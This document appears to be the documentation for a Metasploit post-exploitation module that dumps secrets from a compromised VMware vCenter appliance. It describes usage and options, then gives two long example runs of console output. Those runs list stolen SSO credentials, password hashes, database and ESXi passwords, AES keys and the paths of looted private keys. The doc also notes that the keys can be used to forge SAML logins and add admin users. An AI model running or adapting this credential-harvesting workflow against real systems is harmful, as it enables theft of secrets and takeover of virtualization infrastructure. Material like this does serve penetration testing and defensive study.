Grab secrets and keys from the vCenter server and add them to loot. Secrets include the dcAccountDN
and dcAccountPassword for the vCenter machine which can be used for maniuplating the SSO domain via
standard LDAP interface; good for plugging into the vmware_vcenter_vmdir_ldap module or for adding
new SSO admin users. The MACHINE_SSL, VMCA_ROOT and SSO IdP certificates with assocaited private keys
are also plundered and can be used to sign forged SAML assertions for the /ui admin interface.

## Vulnerable Application
This module is tested against the vCenter appliance only; it will not work on Windows vCenter
instances. It is intended to be run after successfully acquiring root access on a vCenter appliance
and is useful for penetrating further into the environment following a vCenter exploit that results
in a root shell. This module has been tested against vCenter appliance versions 7.0 and 6.7 but will
probably work against other versions of vCenter appliance.

## Verification Steps
This is a post module and requires a meterpreter or shell session on the vCenter appliance with root
access.

1. Start msfconsole
2. Get session on vCenter appliance via exploit of your choice and background it
3. Do: `use post/linux/gather/vcenter_secrets_dump`
4. Do: `set session <session>`
15. Do: `dump`

## Options
**SESSION**

Which session to use, which can be viewed with `sessions -l`

## Advanced Options
**DUMP_VMDIR**

Boolean value that controls whether the module will attempt to extract vSphere SSO domain
information, including SSO user hashes and a complete LDIF dump of the SSO directory. Defaults
to true.

**DUMP_VMAFD**

Boolean value that controls whether the module will attempt to extract vSphere certificates, private
keys, and secrets. Defaults to true.

**DUMP_SPEC**

If DUMP_VMAFD is also true, attempt to extract VM Guest Customization secrets from PSQL using the
DATA-ENCIPHERMENT key extracted from VMAFD. Defaults to true.

## Scenarios
Example run from meterpreter session on vCenter appliance version 7.0.2

```
msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
session => 1
msf6 post(linux/gather/vcenter_secrets_dump) > dump

[*] VMware VirtualCenter 7.0.2 build-18356314
[*] Gathering vSphere SSO domain information ...
[*] vSphere Hostname and IPv4: vcenter01.cesium137.io [192.168.100.11]
[+] vSphere SSO DC DN: cn=vcenter01.cesium137.io,ou=Domain Controllers,dc=vsphere,dc=local
[+] vSphere SSO DC PW: St!7qiz%33;2Px@A1cfb
[*] Extract vmdird tenant AES encryption keys ...
[+] vSphere Tenant AES encryption key: dyOiAcR(Lx' gp{: hex: 64794f69416352284c78272067707b3a
[*] Extract vmware-vpx AES key ...
[+] vmware-vpx AES encryption key hex: b3abd918ce326cf700b77da40b864ed73a6676310e791687e1e025d8d66f690f
[*] Extracting PostgreSQL database credentials ...
[+] VCDB Name: VCDB User: vc PW: XhsxOKLZ_0{tGC9#
[*] Extract ESXi host vpxuser credentials ...
[+] ESXi Host esxi01.cesium137.io [192.168.100.101] vpxuser PW: 3be=IDc}11gs$%v91^JgBO]BlI8}^:]Z
[+] ESXi Host esxi02.cesium137.io [192.168.100.102] vpxuser PW: 1gp0o7o[~/Fk^b.5x52km\YIl.VsgTK8
[*] Extracting vSphere SSO domain secrets ...
[*] Dumping vmdir schema to LDIF ...
[+] LDIF Dump: /home/cs137/.msf4/loot/20220503143428_dev_192.168.100.11_vmdir_442200.ldif
[*] Processing vmdir LDIF (this may take several minutes) ...
[*] Processing LDIF entries ...
[*] Processing SSO account hashes ...
[+] vSphere SSO User Credential: CN=workload_storage_management-ec24f710-eb5f-4c56-8d75-04e3acd8a8c2,cn=ServicePrincipals,dc=vsphere,dc=local:$dynamic_82$33ddf30f6b0424709bc10cc0c9c5a8e5959379323fb9d334ee9fcfe39d97e6bd20e9fd39772eef62a00ee8d1aee5391a91dc4f14b4ddd23a343ffb99286912b6$HEX$7aa1f5b608ac139e0228b3641780f066
[+] vSphere SSO User Credential: CN=workload_storage_management-0445bb8f-6d93-4542-b5f2-8e001f244c4d,cn=ServicePrincipals,dc=vsphere,dc=local:$dynamic_82$f36a754e1fe140469d474ed2bc38b9d2731dbf0fa5696d97b1a5ef43184afdf2c3fb34adfd53b5a64b9758aad1d8ceb95f3737c4b56f927130a5677f4e069024$HEX$255677e68a4cb70f248c0c1c5cc0d535
[+] vSphere SSO User Credential: cn=vcenter01.cesium137.io,ou=Domain Controllers,dc=vsphere,dc=local:$dynamic_82$261e4cf02319b07804641c2fc4857347067ad90d309f616388189bdb884a465a482b136be1123702c93edea030e690a78df52c7cc64c3e70e2b3a3711a198875$HEX$00c9af9c9f3dc42f45394a45680186f0
[+] vSphere SSO User Credential: cn=vpsc02.cesium137.io,ou=Domain Controllers,dc=vsphere,dc=local:$dynamic_82$c8dc9df7ba182c7d6936c410ab9c853f8c147bc7a46d0514103400aba645c5be793486f046a16c9eef9e59f1c96bff957800dfd0c0ae655ab96e07b232065f25$HEX$82d41cdccd86ced37414bff1c8d8677c
[+] vSphere SSO User Credential: cn=vcenter02.cesium137.io,ou=Domain Controllers,dc=vsphere,dc=local:$dynamic_82$0ed0880ca0e729c500efb167b483b97438243240877d819068f3b72c48c1cb16b2a18b9eb7a9c837abcf1d3cbc178e7ac19ae67545d4a209160fafea077da3d5$HEX$c331dc88e73aabc8d96f50857c461b6c
[+] vSphere SSO User Credential: CN=waiter-3caf7fef-84fa-4f93-93e5-adeeea22d421,cn=users,dc=vsphere,dc=local:$dynamic_82$5c28979073432937d71819dc359e7b0be0427abf124e80c0cbb826ee127f97c7a4f1c292aa82890d8d0872d610671c84c435ed5c4ed7f5fce0d3d1990943f6b2$HEX$599215fb7018265c2fa36a47b4ac6367
[+] vSphere SSO User Credential: CN=waiter a8e38b28-999a-4ed8-ac8d-9ddf0609a713,cn=users,dc=vsphere,dc=local:$dynamic_82$1881e13ab2cb1fb07a14ad09abfead757e64c7c0f016517267a3b7f08fe6b8f769ec6a1e2186c50359a88ebe05eeef71be0e79d46c352614c4bea0228310d289$HEX$8bf5f1fc78282695c8302a65270488e5
[+] vSphere SSO User Credential: CN=waiter 3699041e-1df3-4c9b-b19b-83089a0c1fd3,cn=users,dc=vsphere,dc=local:$dynamic_82$7cedf7b7509db4b7cd765a9420feb229c890d5ca2fede1cef9acde88c8dd47eb3100ac638c0cdfc835db87c7996dbdd306229e3c82d4d59c5f1074a60be601c3$HEX$02b97b55a88e9a0da17009f5f2cbbba3
[+] vSphere SSO User Credential: CN=waiter 39b36112-8919-44a3-9bb4-16220d893685,cn=users,dc=vsphere,dc=local:$dynamic_82$f3c082819e1efb8af638d3babf414d50a04711df95912e33eeeba416eed4b5dac64c6e099b8669697ef07a3e7eb2143b422838c26c30d053843c8d203c0a47ae$HEX$09a6f94e00ef8c31dcd02b51f1f32424
[+] vSphere SSO User Credential: CN=waiter 7d8434a8-add2-430a-9457-f5f15d9a74b8,cn=users,dc=vsphere,dc=local:$dynamic_82$f2a6ebbb6dcb5abc870e2f1ad84db9e6e631b7a262e247e4188b7afe1cd42c49db3a08b6334a115af95e9a327294f81d9f0672e7b4a637203d4a1c92da81bad6$HEX$00a3aff20941067ce84156dd13b61107
[+] vSphere SSO User Credential: CN=waiter-7bbefce3-9e0d-49c0-a204-9d275af3d259,cn=users,dc=vsphere,dc=local:$dynamic_82$e6f4e99f3b7990af327246bb8cd4c66933fcd86b97441da875029482f7a290fc4e5eea0e753cb8ee89cb4531730e5ff631349fc65456af6fc9e79505b22ec57d$HEX$13075497741d56d0d71f0b1eedb878ea
[+] vSphere SSO User Credential: cn=krbtgt/VSPHERE.LOCAL,cn=users,dc=VSPHERE,dc=LOCAL:$dynamic_82$360cbc987ac2a96862ca30951ee34810e850b2976aab6a799f6a0158e43c72bda4525159c5aee958b4d567d125823f7040d0efe2ca36140a41b0e42230ce55ae$HEX$438a4343f8df8811b18af35246f5309f
[+] vSphere SSO User Credential: cn=K/M,cn=users,dc=VSPHERE,dc=LOCAL:$dynamic_82$c92391404befe611ad2f9c20d6f521fb183a6d30762b44961cf9ace1714032721570c942cff57c38a8d3dbaafa2841819318b0308f2dba8e4ae0603a7c784ab7$HEX$e048ed8e208704464f688bce99e330b0
[+] vSphere SSO User Credential: cn=Administrator,cn=Users,dc=vsphere,dc=local:$dynamic_82$b5ca7b488446b18c3fb94a348d16fc336c86af43b7b2ae8410984f09b3f7245ac00bf40a62c1efde98d94e333945c5a1ab385d365bac378016f337f39ac3489e$HEX$a021eafda1cec51c7cdf519b80ae549c
[+] vSphere SSO User Credential: CN=metasploit,CN=Users,dc=vsphere,dc=local:$dynamic_82$1caf99644bf6ccc50dac6013e8904ce8b0b0eff16b794598f04d2f7397bab2927d35cef9e320b16342384287a08b10b38a6583bd7d535117751bdc0980798264$HEX$ac970912b2ba39c356bb744317119df3
[+] vSphere SSO User Credential: cn=vmca/vcenter01.cesium137.io@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$ef489edafd1d83898fae1f722db842a968fbbe217df75cae9fe92f8dafb3a35d4ab8893f9593611b1227bfcd9819f09504d3eccfb19156b221a6d2ca9ec8fd2e$HEX$77a9dc5f4dfda08d807e0bc619ccfca4
[+] vSphere SSO User Credential: cn=ldap/vcenter01.cesium137.io@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$f5495355fae1701486912bde4ad9f70c74e080f74f314da54b518b8f8607f2f927cfb95363398612c1896938e5f8c3434564429e7f5824ec7728222f0ece682f$HEX$3c2b68f41dbba61f5a523f75f31b60ee
[+] vSphere SSO User Credential: cn=DNS/vcenter01.cesium137.io@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$e74daf82ff2d2bf4df8d61bdce19e45b2be0cda688e5f1d6bd08c9f24c9d192af3c68da9a634dec22e2a51bc28c75df3c23745346ffd47db5975fad177d1a555$HEX$bc9a096a52fe56b7a815bebc7bb8f4fe
[+] vSphere SSO User Credential: cn=host/vcenter01.cesium137.io@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$6dda0cb0b521e266a145c707e3f2557cbfb0ec741dfb26abc777e3f85ff2320d3fcb4f8fd8f1d2e1f32c756f08f0b5cc693b561617124abd4d8ac93f8bbef9a4$HEX$92035bd0b5a71a480a406dfd79f82f9b
[+] vSphere SSO User Credential: cn=vmca/vpsc02.cesium137.io@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$594c04de02a30041b6448c344664bc53c7e232a1ee6d5e29ac358d47834bf77054403235699ebe9f91439dcf8fda4e4728d5532a4dddb8f548a259eeb3590061$HEX$addf629942720b8f102cfb96b192bc8b
[+] vSphere SSO User Credential: cn=ldap/vpsc02.cesium137.io@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$9abbb4a19a4c6f107f36dd8b708f5f151f4f744d7437335c976e4e8adb5c7e286741a75ad14bb585f44780c8ff0792efe3abb1cf5f4330cf4a0cf6556466d0bf$HEX$58d6addcb4ee52df4988302b6a2f2310
[+] vSphere SSO User Credential: cn=host/vpsc02.cesium137.io@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$5a9724d4acf93f9c1c20afb2f9f64a828df3dacc36f846450c9f07bab725184627393a36aa13e2bc6f8ddbd06e1e6e5a17e4f8892aee7df56aa298268a2ba8ca$HEX$03f238946b6341e6602d74d003fe4042
[+] vSphere SSO User Credential: cn=vmca/vcenter02.cesium137.io@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$29f0ad0bb606fc4e1dc3af70fc5e9ccb08f1255bb926a5700a3682c83e2a1a732968ed0a2da74455e2c2a2384b670b30dd817a1f0e48f5cdc242db4e6b8aee39$HEX$e1e24ff54acaa46d56875ae4c66683e7
[+] vSphere SSO User Credential: cn=ldap/vcenter02.cesium137.io@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$7e9c85e1a314dbaedbf52407dee2aacb10b3a52650e6e3dd74dae1e155c856588e6079534942e0510dfd51c847f3b55b9341b19c85f9a151227e58c21a365f1e$HEX$ce394a2c15db9c5005f6358ce8d1a020
[+] vSphere SSO User Credential: cn=DNS/vcenter02.cesium137.io@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$624f0f9887910b0498b5da5e142b4ee1ba98c5384f188b9bc134a73f27688416e96ea001072cfa3ffb2a30a2a432d635661b46d7335b48ad963327c1041bd2b1$HEX$a23bdbb173b3af717692617df06de4d5
[+] vSphere SSO User Credential: cn=host/vcenter02.cesium137.io@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:$dynamic_82$de963b26e0e66f6115d5dedf3453da6690bbc06888400fa9126dc306f32866d44315c4e6e87fa9fd3f6f62be458a2170392e0ac8af16d3e59628253da8a8463b$HEX$a495926b9d71302a594d0c303ffb86cd
[*] Processing SSO identity sources ...
[*] Found SSO Identity Source Credential:
[+] IDENTITY_STORE_TYPE_VMWARE_DIRECTORY @ ldap://vcenter02.cesium137.io:389:
[+] SSOUSER: vpsc01.cesium137.io@vsphere.local
[+] SSOPASS: prfFHx`4I|e!$1hJZn]q
[+] SSODOMAIN: vsphere.local
[*] Found SSO Identity Source Credential:
[+] IDENTITY_STORE_TYPE_ACTIVE_DIRECTORY @ ldap://cesium137.io:
[+] SSOUSER: vSphereSvc@cesium137.io
[+] SSOPASS: %XkAl222bvCCx46VB
[+] SSODOMAIN: cesium137.io
[*] Extracting certificates from vSphere platform ...
[+] VMCA_ROOT key: /home/cs137/.msf4/loot/20220503143431_dev_192.168.100.11_vmca_584377.key
[+] VMCA_ROOT cert: /home/cs137/.msf4/loot/20220503143432_dev_192.168.100.11_vmca_373989.pem
[+] SSO_STS_IDP key: /home/cs137/.msf4/loot/20220503143434_dev_192.168.100.11_idp_495008.key
[+] SSO_STS_IDP cert: /home/cs137/.msf4/loot/20220503143434_dev_192.168.100.11_idp_590306.pem
[+] MACHINE_SSL_CERT key: /home/cs137/.msf4/loot/20220503143436_dev_192.168.100.11___MACHINE_CERT_035985.key
[+] MACHINE_SSL_CERT cert: /home/cs137/.msf4/loot/20220503143437_dev_192.168.100.11___MACHINE_CERT_047549.pem
[+] MACHINE key: /home/cs137/.msf4/loot/20220503143440_dev_192.168.100.11_machine_352224.key
[+] MACHINE cert: /home/cs137/.msf4/loot/20220503143440_dev_192.168.100.11_machine_590500.pem
[+] VSPHERE-WEBCLIENT key: /home/cs137/.msf4/loot/20220503143442_dev_192.168.100.11_vspherewebclien_717603.key
[+] VSPHERE-WEBCLIENT cert: /home/cs137/.msf4/loot/20220503143443_dev_192.168.100.11_vspherewebclien_499228.pem
[+] VPXD key: /home/cs137/.msf4/loot/20220503143445_dev_192.168.100.11_vpxd_493932.key
[+] VPXD cert: /home/cs137/.msf4/loot/20220503143445_dev_192.168.100.11_vpxd_945960.pem
[+] VPXD-EXTENSION key: /home/cs137/.msf4/loot/20220503143447_dev_192.168.100.11_vpxdextension_661250.key
[+] VPXD-EXTENSION cert: /home/cs137/.msf4/loot/20220503143448_dev_192.168.100.11_vpxdextension_184377.pem
[+] SMS key: /home/cs137/.msf4/loot/20220503143450_dev_192.168.100.11_sms_self_signed_108815.key
[+] SMS cert: /home/cs137/.msf4/loot/20220503143450_dev_192.168.100.11_sms_self_signed_717860.pem
[+] DATA-ENCIPHERMENT key: /home/cs137/.msf4/loot/20220503143453_dev_192.168.100.11_dataenciphermen_619118.key
[+] DATA-ENCIPHERMENT cert: /home/cs137/.msf4/loot/20220503143454_dev_192.168.100.11_dataenciphermen_976218.pem
[+] HVC key: /home/cs137/.msf4/loot/20220503143456_dev_192.168.100.11_hvc_722861.key
[+] HVC cert: /home/cs137/.msf4/loot/20220503143456_dev_192.168.100.11_hvc_786924.pem
[+] WCP key: /home/cs137/.msf4/loot/20220503143458_dev_192.168.100.11_wcp_253108.key
[+] WCP cert: /home/cs137/.msf4/loot/20220503143459_dev_192.168.100.11_wcp_046781.pem
[*] Searching for secrets in VM Guest Customization Specification XML ...
[*] Processing vpx_customization_spec 'Windows 10 Enterprise' ...
[*] Validating data encipherment key ...
[!] Could not associate encryption public key with any of the private keys extracted from vCenter, skipping
[*] Processing vpx_customization_spec 'Windows Server 2016 Datacenter' ...
[*] Validating data encipherment key ...
[*] Initial administrator account password found for vpx_customization_spec 'Windows Server 2016 Datacenter':
[+] Built-in administrator PW: IAmSam!
[*] AD domain join account found for vpx_customization_spec 'Windows Server 2016 Datacenter':
[+] AD User: vSphereSvc@cesium137.io
[+] AD Pass: SamIAm!
[*] Post module execution completed
```

Example run from vCenter 6.0 Update 3j

```
msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
session => 1
msf6 post(linux/gather/vcenter_secrets_dump) > dump

[*] VMware VirtualCenter 6.0.0 build-14510547
[*] Gathering vSphere SSO domain information ...
[*] vSphere Hostname and IPv4: vcenteralpha [192.168.100.60]
[+] vSphere SSO DC DN: cn=vcenteralpha.cesium137.io,ou=Domain Controllers,dc=alpha,dc=vsphere,dc=local
[+] vSphere SSO DC PW: <PMW{T:4mnb@UBs/$f(w
[*] Extract vmdird tenant AES encryption keys ...
[+] vSphere Tenant AES encryption key: (>d%>D3'i@rAj}!" hex: 283e64253e443327694072416a7d2122
[*] Extract vmware-vpx AES key ...
[+] vmware-vpx AES encryption key hex: acdeb90515681eb8c357e3a94312106934f174324c39d1deb012337effc124de
[*] Extracting PostgreSQL database credentials ...
[+] VCDB Name: VCDB User: vc PW: 4yFcqZ2$m^&H<K?z
[*] Extract ESXi host vpxuser credentials ...
[*] Extracting vSphere SSO domain secrets ...
[*] Dumping vmdir schema to LDIF ...
[+] LDIF Dump: /home/cs137/.msf4/loot/20220503144159_dev_192.168.100.60_vmdir_157656.ldif
[*] Processing vmdir LDIF (this may take several minutes) ...
[*] Processing LDIF entries ...
[*] Processing SSO account hashes ...
[+] vSphere SSO User Credential: cn=vcenteralpha.cesium137.io,ou=Domain Controllers,dc=alpha,dc=vsphere,dc=local:$dynamic_82$95fe2a1c250329ff99f3ebf364a58f1ee4263560c30c8010c9774b4f5bf151ef3df4b378ab88a2e3629f714ed1b0060f3ae10b7bd7533d025f47d33542bf8ade$HEX$28d03ba88a83c83ae1d999b77259670c
[+] vSphere SSO User Credential: CN=waiter 514f2778-d8c0-49aa-a10b-1951699cc8c6,cn=users,dc=alpha,dc=vsphere,dc=local:$dynamic_82$495c53a6dd4b813638608feb0b4a1b27045d41e36e798c68ebdb312edc2f16c77d780c2b4fc6bed438cfd0ef743f1c1e0363692bd2c195371c2d4dd0b9862f39$HEX$b74fe42af9579d6c5536a50872c9eedf
[+] vSphere SSO User Credential: cn=krbtgt/ALPHA.VSPHERE.LOCAL,cn=users,dc=ALPHA,dc=VSPHERE,dc=LOCAL:$dynamic_82$1c01a034aadd563bea5be04b9e74dbc5bb9ac37694f58bda6eea0e83df97bc64e5fdf932991a9bcaaf82da6300542e8d8d51c16282e9aaa08da2c6c65a8b7cdc$HEX$2434b5c538e31bb3854bcd277a5f63ab
[+] vSphere SSO User Credential: cn=K/M,cn=users,dc=ALPHA,dc=VSPHERE,dc=LOCAL:$dynamic_82$525d688d4614db9939ffdba8e41e76bc3bd473b0cc4fdeac0994042d3a5a7adc9c8e46040c846d6c7f449f7f94f9d3370cc554ab668dcd3d1006ca38a60fb70d$HEX$fd6001dd5be548498d94bf08641d657d
[+] vSphere SSO User Credential: cn=Administrator,cn=Users,dc=alpha,dc=vsphere,dc=local:$dynamic_82$3a4fc4fbacbc6d10e4787383841ebc38fc20ebbb7780692ee0c5fa4b1a2bd675b7c41e8604f4a0eba9546993b971790115279281a108e6e21f4b83740fae449f$HEX$db1d08918cc2eb7bb372545b449643ca
[+] vSphere SSO User Credential: cn=vmca/vcenteralpha.cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$6d7a381d442a674bcc730604160c6963adc937a45a14b9d8e750b55fd3500e54c1bd739968a611a63f747db0ebbe8d31f0d96e5b84a2d72c3c79f922e922adc7$HEX$68fbf3edaba87c972f2423d670377cd7
[+] vSphere SSO User Credential: cn=ldap/vcenteralpha.cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$f584f632b79113f1a5f31d0d8e1df094438fd1644140fd3692a880e4c3ddb8a25969a71ec0e10b31c61aa256217cc0e4c014a21350645b2a3fb7327d0ee5f96a$HEX$9cfee2bcd297134f1d5a921c20f373e8
[+] vSphere SSO User Credential: cn=host/vcenteralpha.cesium137.io@ALPHA.VSPHERE.LOCAL,cn=Managed Service Accounts,dc=alpha,dc=vsphere,dc=local:$dynamic_82$ac83726dabc4a021b7737b1e696eba9067e73fc8058e719733b2f4ebded115ae653dd75f13ec26b6a641986c772b20bf37be999c9978d220e94f1d0eeab9d3b8$HEX$91dae8ef6feae8880dd9708664040598
[*] Processing SSO identity sources ...
[*] Found SSO Identity Source Credential:
[+] IDENTITY_STORE_TYPE_VMWARE_DIRECTORY @ ldap://localhost:389:
[+] SSOUSER: cn=vcenteralpha.cesium137.io,ou=Domain Controllers,DC=alpha,DC=vsphere,DC=local
[+] SSOPASS: <PMW{T:4mnb@UBs/$f(w
[+] SSODOMAIN: alpha.vsphere.local
[*] Extracting certificates from vSphere platform ...
[+] VMCA_ROOT key: /home/cs137/.msf4/loot/20220503144201_dev_192.168.100.60_vmca_075148.key
[+] VMCA_ROOT cert: /home/cs137/.msf4/loot/20220503144201_dev_192.168.100.60_vmca_217694.pem
[!] vmwSTSPrivateKey was not found in vmdir, checking for legacy ssoserverSign key PEM files ...
[-] Unable to query IDM tenant information, cannot validate ssoserverSign certificate against IDM
[!] Could not reconcile vmdir STS IdP cert chain with cert chain advertised by IDM - this credential may not work
[+] SSO_STS_IDP key: /home/cs137/.msf4/loot/20220503144203_dev_192.168.100.60_idp_658848.key
[+] SSO_STS_IDP cert: /home/cs137/.msf4/loot/20220503144203_dev_192.168.100.60_idp_801629.pem
[+] MACHINE_SSL_CERT key: /home/cs137/.msf4/loot/20220503144206_dev_192.168.100.60___MACHINE_CERT_215002.key
[+] MACHINE_SSL_CERT cert: /home/cs137/.msf4/loot/20220503144206_dev_192.168.100.60___MACHINE_CERT_468549.pem
[+] MACHINE key: /home/cs137/.msf4/loot/20220503144209_dev_192.168.100.60_machine_609849.key
[+] MACHINE cert: /home/cs137/.msf4/loot/20220503144210_dev_192.168.100.60_machine_688132.pem
[+] VSPHERE-WEBCLIENT key: /home/cs137/.msf4/loot/20220503144212_dev_192.168.100.60_vspherewebclien_019807.key
[+] VSPHERE-WEBCLIENT cert: /home/cs137/.msf4/loot/20220503144212_dev_192.168.100.60_vspherewebclien_683531.pem
[+] VPXD key: /home/cs137/.msf4/loot/20220503144214_dev_192.168.100.60_vpxd_431794.key
[+] VPXD cert: /home/cs137/.msf4/loot/20220503144215_dev_192.168.100.60_vpxd_798188.pem
[+] VPXD-EXTENSION key: /home/cs137/.msf4/loot/20220503144217_dev_192.168.100.60_vpxdextension_621629.key
[+] VPXD-EXTENSION cert: /home/cs137/.msf4/loot/20220503144217_dev_192.168.100.60_vpxdextension_661698.pem
[+] SMS key: /home/cs137/.msf4/loot/20220503144219_dev_192.168.100.60_sms_self_signed_130806.key
[+] SMS cert: /home/cs137/.msf4/loot/20220503144220_dev_192.168.100.60_sms_self_signed_905150.pem
[*] Searching for secrets in VM Guest Customization Specification XML ...
[!] No vpx_customization_spec entries evident
[*] Post module execution completed
```
